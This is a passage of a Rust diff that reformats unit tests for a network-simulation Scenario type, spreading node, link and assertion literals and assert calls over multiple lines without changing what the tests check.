@@ -122,7 +122,7 @@ fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
         let mut edge_vec = vec![1, 2, 3, 4, 5];
         push_bounded(&mut edge_vec, 6, 3);
         assert_eq!(edge_vec.len(), 3, "should evict oldest when at capacity");
-        assert_eq!(edge_vec[edge_vec.len()-1], 6, "new item should be last");
+        assert_eq!(edge_vec[edge_vec.len() - 1], 6, "new item should be last");
     }
 }
 
@@ -522,20 +522,26 @@ impl Scenario {
                 name: "test".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![VirtualNode {
-                    id: "n1".to_string(),
-                    name: "Node 1".to_string(),
-                    role: NodeRole::Coordinator,
-                }, VirtualNode {
-                    id: "n2".to_string(),
-                    name: "Node 2".to_string(),
-                    role: NodeRole::Participant,
-                }],
+                nodes: vec![
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
+                ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert!(invalid_schema.validate().is_err(), "empty schema version should fail");
+            assert!(
+                invalid_schema.validate().is_err(),
+                "empty schema version should fail"
+            );
 
             // Test: node count exactly at MIN_NODES boundary
             let min_boundary = Scenario {
@@ -552,7 +558,10 @@ impl Scenario {
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert!(min_boundary.validate().is_err(), "below MIN_NODES should fail");
+            assert!(
+                min_boundary.validate().is_err(),
+                "below MIN_NODES should fail"
+            );
 
             // Test: self-referencing link (source == target)
             let self_loop = Scenario {
@@ -561,8 +570,16 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![VirtualLink {
                     id: "self".to_string(),
@@ -597,7 +614,11 @@ impl Scenario {
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(empty_scenario.node_count(), 0, "empty scenario should have 0 nodes");
+            assert_eq!(
+                empty_scenario.node_count(),
+                0,
+                "empty scenario should have 0 nodes"
+            );
 
             // Test: single node scenario
             let single_node = Scenario {
@@ -614,7 +635,11 @@ impl Scenario {
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(single_node.node_count(), 1, "single node scenario should have 1 node");
+            assert_eq!(
+                single_node.node_count(),
+                1,
+                "single node scenario should have 1 node"
+            );
 
             // Test: maximum allowed nodes
             let mut max_nodes = Vec::new();
@@ -635,7 +660,11 @@ impl Scenario {
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(max_scenario.node_count(), MAX_NODES, "max scenario should have MAX_NODES nodes");
+            assert_eq!(
+                max_scenario.node_count(),
+                MAX_NODES,
+                "max scenario should have MAX_NODES nodes"
+            );
 
             // Test: node count consistency with vector length
             let test_scenario = Scenario {
@@ -644,15 +673,31 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
-                    VirtualNode { id: "n3".to_string(), name: "Node 3".to_string(), role: NodeRole::Observer },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
+                    VirtualNode {
+                        id: "n3".to_string(),
+                        name: "Node 3".to_string(),
+                        role: NodeRole::Observer,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(test_scenario.node_count(), test_scenario.nodes.len(), "node_count should match nodes.len()");
+            assert_eq!(
+                test_scenario.node_count(),
+                test_scenario.nodes.len(),
+                "node_count should match nodes.len()"
+            );
 
             // Test: boundary at MIN_NODES - 1
             let below_min = Scenario {
@@ -669,7 +714,11 @@ impl Scenario {
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(below_min.node_count(), MIN_NODES - 1, "below min should have MIN_NODES - 1");
+            assert_eq!(
+                below_min.node_count(),
+                MIN_NODES - 1,
+                "below min should have MIN_NODES - 1"
+            );
 
             // Test: node count with duplicate IDs (structural test)
             let dup_ids = Scenario {
@@ -678,14 +727,26 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "same".to_string(), name: "First".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "same".to_string(), name: "Second".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "same".to_string(),
+                        name: "First".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "same".to_string(),
+                        name: "Second".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(dup_ids.node_count(), 2, "node count should include duplicates structurally");
+            assert_eq!(
+                dup_ids.node_count(),
+                2,
+                "node count should include duplicates structurally"
+            );
 
             // Test: node count deterministic across multiple calls
             let stable_scenario = Scenario {
@@ -694,15 +755,27 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "stable1".to_string(), name: "Stable 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "stable2".to_string(), name: "Stable 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "stable1".to_string(),
+                        name: "Stable 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "stable2".to_string(),
+                        name: "Stable 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
             for _ in 0..5 {
-                assert_eq!(stable_scenario.node_count(), 2, "node count should be deterministic");
+                assert_eq!(
+                    stable_scenario.node_count(),
+                    2,
+                    "node count should be deterministic"
+                );
             }
         }
     }
@@ -722,14 +795,26 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(no_links.link_count(), 0, "scenario with no links should have count 0");
+            assert_eq!(
+                no_links.link_count(),
+                0,
+                "scenario with no links should have count 0"
+            );
 
             // Test: single link scenario
             let single_link = Scenario {
@@ -738,8 +823,16 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![VirtualLink {
                     id: "link1".to_string(),
@@ -750,7 +843,11 @@ impl Scenario {
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(single_link.link_count(), 1, "single link scenario should have count 1");
+            assert_eq!(
+                single_link.link_count(),
+                1,
+                "single link scenario should have count 1"
+            );
 
             // Test: fully connected graph (all possible links between nodes)
             let full_mesh = Scenario {
@@ -759,22 +856,68 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "a".to_string(), name: "Node A".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "b".to_string(), name: "Node B".to_string(), role: NodeRole::Participant },
-                    VirtualNode { id: "c".to_string(), name: "Node C".to_string(), role: NodeRole::Observer },
+                    VirtualNode {
+                        id: "a".to_string(),
+                        name: "Node A".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "b".to_string(),
+                        name: "Node B".to_string(),
+                        role: NodeRole::Participant,
+                    },
+                    VirtualNode {
+                        id: "c".to_string(),
+                        name: "Node C".to_string(),
+                        role: NodeRole::Observer,
+                    },
                 ],
                 links: vec![
-                    VirtualLink { id: "ab".to_string(), source_node: "a".to_string(), target_node: "b".to_string(), bidirectional: false },
-                    VirtualLink { id: "ac".to_string(), source_node: "a".to_string(), target_node: "c".to_string(), bidirectional: false },
-                    VirtualLink { id: "ba".to_string(), source_node: "b".to_string(), target_node: "a".to_string(), bidirectional: false },
-                    VirtualLink { id: "bc".to_string(), source_node: "b".to_string(), target_node: "c".to_string(), bidirectional: false },
-                    VirtualLink { id: "ca".to_string(), source_node: "c".to_string(), target_node: "a".to_string(), bidirectional: false },
-                    VirtualLink { id: "cb".to_string(), source_node: "c".to_string(), target_node: "b".to_string(), bidirectional: false },
+                    VirtualLink {
+                        id: "ab".to_string(),
+                        source_node: "a".to_string(),
+                        target_node: "b".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "ac".to_string(),
+                        source_node: "a".to_string(),
+                        target_node: "c".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "ba".to_string(),
+                        source_node: "b".to_string(),
+                        target_node: "a".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "bc".to_string(),
+                        source_node: "b".to_string(),
+                        target_node: "c".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "ca".to_string(),
+                        source_node: "c".to_string(),
+                        target_node: "a".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "cb".to_string(),
+                        source_node: "c".to_string(),
+                        target_node: "b".to_string(),
+                        bidirectional: false,
+                    },
                 ],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(full_mesh.link_count(), 6, "full mesh of 3 nodes should have 6 directed links");
+            assert_eq!(
+                full_mesh.link_count(),
+                6,
+                "full mesh of 3 nodes should have 6 directed links"
+            );
 
             // Test: self-loops count as links
             let with_self_loops = Scenario {
@@ -783,18 +926,45 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![
-                    VirtualLink { id: "n1_self".to_string(), source_node: "n1".to_string(), target_node: "n1".to_string(), bidirectional: true },
-                    VirtualLink { id: "n2_self".to_string(), source_node: "n2".to_string(), target_node: "n2".to_string(), bidirectional: false },
-                    VirtualLink { id: "n1_n2".to_string(), source_node: "n1".to_string(), target_node: "n2".to_string(), bidirectional: true },
+                    VirtualLink {
+                        id: "n1_self".to_string(),
+                        source_node: "n1".to_string(),
+                        target_node: "n1".to_string(),
+                        bidirectional: true,
+                    },
+                    VirtualLink {
+                        id: "n2_self".to_string(),
+                        source_node: "n2".to_string(),
+                        target_node: "n2".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "n1_n2".to_string(),
+                        source_node: "n1".to_string(),
+                        target_node: "n2".to_string(),
+                        bidirectional: true,
+                    },
                 ],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(with_self_loops.link_count(), 3, "self-loops should be counted as links");
+            assert_eq!(
+                with_self_loops.link_count(),
+                3,
+                "self-loops should be counted as links"
+            );
 
             // Test: duplicate link IDs (structural count)
             let dup_link_ids = Scenario {
@@ -803,17 +973,39 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![
-                    VirtualLink { id: "same".to_string(), source_node: "n1".to_string(), target_node: "n2".to_string(), bidirectional: false },
-                    VirtualLink { id: "same".to_string(), source_node: "n2".to_string(), target_node: "n1".to_string(), bidirectional: false },
+                    VirtualLink {
+                        id: "same".to_string(),
+                        source_node: "n1".to_string(),
+                        target_node: "n2".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "same".to_string(),
+                        source_node: "n2".to_string(),
+                        target_node: "n1".to_string(),
+                        bidirectional: false,
+                    },
                 ],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(dup_link_ids.link_count(), 2, "duplicate link IDs should still count structurally");
+            assert_eq!(
+                dup_link_ids.link_count(),
+                2,
+                "duplicate link IDs should still count structurally"
+            );
 
             // Test: links with invalid endpoints (structural count)
             let invalid_endpoints = Scenario {
@@ -821,16 +1013,25 @@ impl Scenario {
                 name: "invalid_endpoints".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                ],
-                links: vec![
-                    VirtualLink { id: "invalid".to_string(), source_node: "n1".to_string(), target_node: "missing".to_string(), bidirectional: false },
-                ],
+                nodes: vec![VirtualNode {
+                    id: "n1".to_string(),
+                    name: "Node 1".to_string(),
+                    role: NodeRole::Coordinator,
+                }],
+                links: vec![VirtualLink {
+                    id: "invalid".to_string(),
+                    source_node: "n1".to_string(),
+                    target_node: "missing".to_string(),
+                    bidirectional: false,
+                }],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(invalid_endpoints.link_count(), 1, "invalid endpoints should still count structurally");
+            assert_eq!(
+                invalid_endpoints.link_count(),
+                1,
+                "invalid endpoints should still count structurally"
+            );
 
             // Test: bidirectional vs unidirectional doesn't affect count
             let mixed_directions = Scenario {
@@ -839,18 +1040,44 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
-                    VirtualNode { id: "n3".to_string(), name: "Node 3".to_string(), role: NodeRole::Observer },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
+                    VirtualNode {
+                        id: "n3".to_string(),
+                        name: "Node 3".to_string(),
+                        role: NodeRole::Observer,
+                    },
                 ],
                 links: vec![
-                    VirtualLink { id: "uni".to_string(), source_node: "n1".to_string(), target_node: "n2".to_string(), bidirectional: false },
-                    VirtualLink { id: "bi".to_string(), source_node: "n2".to_string(), target_node: "n3".to_string(), bidirectional: true },
+                    VirtualLink {
+                        id: "uni".to_string(),
+                        source_node: "n1".to_string(),
+                        target_node: "n2".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "bi".to_string(),
+                        source_node: "n2".to_string(),
+                        target_node: "n3".to_string(),
+                        bidirectional: true,
+                    },
                 ],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(mixed_directions.link_count(), 2, "bidirectional flag doesn't affect link count");
+            assert_eq!(
+                mixed_directions.link_count(),
+                2,
+                "bidirectional flag doesn't affect link count"
+            );
 
             // Test: link count consistency with vector length
             let consistency_test = Scenario {
@@ -859,17 +1086,39 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![
-                    VirtualLink { id: "l1".to_string(), source_node: "n1".to_string(), target_node: "n2".to_string(), bidirectional: false },
-                    VirtualLink { id: "l2".to_string(), source_node: "n2".to_string(), target_node: "n1".to_string(), bidirectional: true },
+                    VirtualLink {
+                        id: "l1".to_string(),
+                        source_node: "n1".to_string(),
+                        target_node: "n2".to_string(),
+                        bidirectional: false,
+                    },
+                    VirtualLink {
+                        id: "l2".to_string(),
+                        source_node: "n2".to_string(),
+                        target_node: "n1".to_string(),
+                        bidirectional: true,
+                    },
                 ],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(consistency_test.link_count(), consistency_test.links.len(), "link_count should match links.len()");
+            assert_eq!(
+                consistency_test.link_count(),
+                consistency_test.links.len(),
+                "link_count should match links.len()"
+            );
 
             // Test: deterministic behavior across multiple calls
             let stable_links = Scenario {
@@ -878,17 +1127,32 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
-                links: vec![
-                    VirtualLink { id: "stable_link".to_string(), source_node: "n1".to_string(), target_node: "n2".to_string(), bidirectional: false },
-                ],
+                links: vec![VirtualLink {
+                    id: "stable_link".to_string(),
+                    source_node: "n1".to_string(),
+                    target_node: "n2".to_string(),
+                    bidirectional: false,
+                }],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
             for _ in 0..5 {
-                assert_eq!(stable_links.link_count(), 1, "link count should be deterministic");
+                assert_eq!(
+                    stable_links.link_count(),
+                    1,
+                    "link count should be deterministic"
+                );
             }
         }
     }
@@ -908,14 +1172,26 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert_eq!(no_assertions.assertion_count(), 0, "scenario with no assertions should have count 0");
+            assert_eq!(
+                no_assertions.assertion_count(),
+                0,
+                "scenario with no assertions should have count 0"
+            );
 
             // Test: single assertion scenario
             let single_assertion = Scenario {
@@ -924,14 +1200,26 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![ScenarioAssertion::AllNodesReachQuiescence],
             };
-            assert_eq!(single_assertion.assertion_count(), 1, "single assertion scenario should have count 1");
+            assert_eq!(
+                single_assertion.assertion_count(),
+                1,
+                "single assertion scenario should have count 1"
+            );
 
             // Test: multiple diverse assertion types
             let multi_assertions = Scenario {
@@ -940,21 +1228,47 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "sender".to_string(), name: "Sender".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "receiver".to_string(), name: "Receiver".to_string(), role: NodeRole::Participant },
-                    VirtualNode { id: "observer".to_string(), name: "Observer".to_string(), role: NodeRole::Observer },
+                    VirtualNode {
+                        id: "sender".to_string(),
+                        name: "Sender".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "receiver".to_string(),
+                        name: "Receiver".to_string(),
+                        role: NodeRole::Participant,
+                    },
+                    VirtualNode {
+                        id: "observer".to_string(),
+                        name: "Observer".to_string(),
+                        role: NodeRole::Observer,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
                     ScenarioAssertion::AllNodesReachQuiescence,
-                    ScenarioAssertion::MessageDelivered { from: "sender".to_string(), to: "receiver".to_string(), within_ticks: 100 },
-                    ScenarioAssertion::PartitionDetected { by_node: "observer".to_string(), within_ticks: 50 },
-                    ScenarioAssertion::EpochTransitionCompleted { epoch: 1, within_ticks: 200 },
+                    ScenarioAssertion::MessageDelivered {
+                        from: "sender".to_string(),
+                        to: "receiver".to_string(),
+                        within_ticks: 100,
+                    },
+                    ScenarioAssertion::PartitionDetected {
+                        by_node: "observer".to_string(),
+                        within_ticks: 50,
+                    },
+                    ScenarioAssertion::EpochTransitionCompleted {
+                        epoch: 1,
+                        within_ticks: 200,
+                    },
                     ScenarioAssertion::NoDeadlock { within_ticks: 300 },
                 ],
             };
-            assert_eq!(multi_assertions.assertion_count(), 5, "multiple assertions should have correct count");
+            assert_eq!(
+                multi_assertions.assertion_count(),
+                5,
+                "multiple assertions should have correct count"
+            );
 
             // Test: duplicate assertions are counted separately
             let dup_assertions = Scenario {
@@ -962,9 +1276,11 @@ impl Scenario {
                 name: "dup_assertions".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                ],
+                nodes: vec![VirtualNode {
+                    id: "n1".to_string(),
+                    name: "Node 1".to_string(),
+                    role: NodeRole::Coordinator,
+                }],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
@@ -974,7 +1290,11 @@ impl Scenario {
                     ScenarioAssertion::NoDeadlock { within_ticks: 100 }, // Duplicate
                 ],
             };
-            assert_eq!(dup_assertions.assertion_count(), 4, "duplicate assertions should count separately");
+            assert_eq!(
+                dup_assertions.assertion_count(),
+                4,
+                "duplicate assertions should count separately"
+            );
 
             // Test: assertions with extreme tick values
             let extreme_ticks = Scenario {
@@ -983,18 +1303,38 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
-                    ScenarioAssertion::MessageDelivered { from: "n1".to_string(), to: "n2".to_string(), within_ticks: 0 }, // Zero ticks
-                    ScenarioAssertion::MessageDelivered { from: "n1".to_string(), to: "n2".to_string(), within_ticks: u64::MAX }, // Max ticks
+                    ScenarioAssertion::MessageDelivered {
+                        from: "n1".to_string(),
+                        to: "n2".to_string(),
+                        within_ticks: 0,
+                    }, // Zero ticks
+                    ScenarioAssertion::MessageDelivered {
+                        from: "n1".to_string(),
+                        to: "n2".to_string(),
+                        within_ticks: u64::MAX,
+                    }, // Max ticks
                     ScenarioAssertion::NoDeadlock { within_ticks: 1 }, // Minimum reasonable ticks
                 ],
             };
-            assert_eq!(extreme_ticks.assertion_count(), 3, "extreme tick values should still count");
+            assert_eq!(
+                extreme_ticks.assertion_count(),
+                3,
+                "extreme tick values should still count"
+            );
 
             // Test: assertions with same nodes but different parameters
             let param_variations = Scenario {
@@ -1003,18 +1343,42 @@ impl Scenario {
                 description: "".to_string(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "a".to_string(), name: "Node A".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "b".to_string(), name: "Node B".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "a".to_string(),
+                        name: "Node A".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "b".to_string(),
+                        name: "Node B".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
-                    ScenarioAssertion::MessageDelivered { from: "a".to_string(), to: "b".to_string(), within_ticks: 10 },
-                    ScenarioAssertion::MessageDelivered { from: "a".to_string(), to: "b".to_string(), within_ticks: 20 },
-                    ScenarioAssertion::MessageDelivered { from: "b".to_string(), to: "a".to_string(), within_ticks: 10 }, // Reverse direction
+                    ScenarioAssertion::MessageDelivered {
+                        from: "a".to_string(),
+                        to: "b".to_string(),
+                        within_ticks: 10,
+                    },
+                    ScenarioAssertion::MessageDelivered {
+                        from: "a".to_string(),
+                        to: "b".to_string(),
+                        within_ticks: 20,
+                    },
+                    ScenarioAssertion::MessageDelivered {
+                        from: "b".to_string(),
+                        to: "a".to_string(),
+                        within_ticks: 10,
+                    }, // Reverse direction
                 ],
             };
-            assert_eq!(param_variations.assertion_count(), 3, "parameter variations should count as separate assertions");
+            assert_eq!(
+                param_variations.assertion_count(),
+                3,
+                "parameter variations should count as separate assertions"
+            );
 
             // Test: assertions with invalid node references (structural count)
             let invalid_node_refs = Scenario {
@@ -1022,17 +1386,30 @@ impl Scenario {
                 name: "invalid_refs".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![
-                    VirtualNode { id: "valid".to_string(), name: "Valid".to_string(), role: NodeRole::Coordinator },
-                ],
+                nodes: vec![VirtualNode {
+                    id: "valid".to_string(),
+                    name: "Valid".to_string(),
+                    role: NodeRole::Coordinator,
+                }],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
-                    ScenarioAssertion::MessageDelivered { from: "valid".to_string(), to: "missing".to_string(), within_ticks: 100 },
-                    ScenarioAssertion::PartitionDetected { by_node: "nonexistent".to_string(), within_ticks: 50 },
+                    ScenarioAssertion::MessageDelivered {
+                        from: "valid".to_string(),
+                        to: "missing".to_string(),
+                        within_ticks: 100,
+                    },
+                    ScenarioAssertion::PartitionDetected {
+                        by_node: "nonexistent".to_string(),
+                        within_ticks: 50,
+                    },
                 ],
             };
-            assert_eq!(invalid_node_refs.assertion_count(), 2, "invalid node references should still count structurally");
+            assert_eq!(
+                invalid_node_refs.assertion_count(),
+                2,
+                "invalid node references should still count structurally"
+            );
 
             // Test: epoch assertions with extreme epoch values
             let extreme_epochs = Scenario {
@@ -1040,18 +1417,33 @@ impl Scenario {
                 name: "extreme_epochs".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                ],
+                nodes: vec![VirtualNode {
+                    id: "n1".to_string(),
+                    name: "Node 1".to_string(),
+                    role: NodeRole::Coordinator,
+                }],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
-                    ScenarioAssertion::EpochTransitionCompleted { epoch: 0, within_ticks: 100 },
-                    ScenarioAssertion::EpochTransitionCompleted { epoch: u64::MAX, within_ticks: 100 },
-                    ScenarioAssertion::EpochTransitionCompleted { epoch: 42, within_ticks: 0 },
+                    ScenarioAssertion::EpochTransitionCompleted {
+                        epoch: 0,
+                        within_ticks: 100,
+                    },
+                    ScenarioAssertion::EpochTransitionCompleted {
+                        epoch: u64::MAX,
+                        within_ticks: 100,
+                    },
+                    ScenarioAssertion::EpochTransitionCompleted {
